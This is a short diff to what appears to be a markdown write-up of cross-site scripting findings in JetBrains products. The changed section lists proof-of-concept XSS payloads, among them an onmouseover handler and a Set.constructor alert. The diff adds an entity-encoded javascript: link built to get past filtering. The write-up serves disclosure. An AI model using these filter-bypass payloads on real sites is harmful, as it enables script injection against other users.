@@ -340,6 +340,7 @@ At first, JetBrains rejected to acknowledge that `<iframe>` or `<script>Set.cons
 * Injects a `<script>` tag that is not executed due to content dynamically spawned: `<a href='//example.com"></a><script>Set.constructor&#96;alert\x28document.domain\x29&#96;&#96;&#96;</script>`.
 * Injects an `<iframe>` tag: `<img src='/"><iframe>`, or any other content without spaces.
 * Injects a script that executes onmouseover: `<a href='/"&nbsp;xxx=&#39;'>xxx' onmouseover="alert('xss')" style="position:fixed;left:0;right:0;top:0;bottom:0;z-index:100;background:white"></a>`. Can be used to inject any other attributes.
+* A link that works on click: `<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70t&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click me!</a>` (note that one letter in protocol is delibirately not escaped).
 
 ### JIRA
 
